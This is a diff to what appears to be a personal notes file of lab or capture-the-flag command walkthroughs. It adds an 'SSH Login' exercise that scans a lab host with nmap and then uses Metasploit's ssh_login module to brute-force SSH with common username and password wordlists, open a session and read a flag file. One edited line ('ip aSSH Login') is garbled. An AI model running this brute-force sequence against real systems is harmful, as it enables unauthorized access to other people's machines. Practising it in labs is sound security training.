@@ -14,7 +14,7 @@ nmap -Pn -sV -p 80 10.0.22.124
 
 02)  Scan the Server 1
 ```
-ip a
+ip aSSH Login
 ping -c 4  192.35.94.3
 nmap 192.35.94.3
 nmap -p-  192.35.94.3
@@ -673,10 +673,25 @@ exit
 cat secret.txt
 ```
 
-37)
+37) SSH Login
 
 ```
-
+nmap -sS -sV 192.245.211.3
+msfconsole
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.245.211.3
+exploit
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.245.211.3
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit
+sessions
+sessions -i 1
+find / -name "flag"
+cat /flag
 ```
 
 
